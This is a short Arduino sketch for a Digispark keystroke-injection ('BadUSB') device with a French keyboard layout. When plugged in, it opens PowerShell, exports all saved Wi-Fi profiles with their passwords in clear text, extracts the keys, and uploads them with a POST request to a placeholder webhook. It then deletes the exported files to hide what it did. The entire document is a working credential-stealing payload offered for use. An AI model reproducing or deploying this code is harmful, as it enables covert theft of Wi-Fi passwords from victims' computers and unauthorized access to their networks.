#include <DigiKeyboardFr.h>

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboardFr.println("powershell"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(2000);
  DigiKeyboardFr.println("netsh wlan export profile key=clear; powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS; Invoke-WebRequest -Uri votre_webhook_ici -Method POST -InFile Wi-Fi-PASS; rm Wi-*; exit");
}

void loop() {}
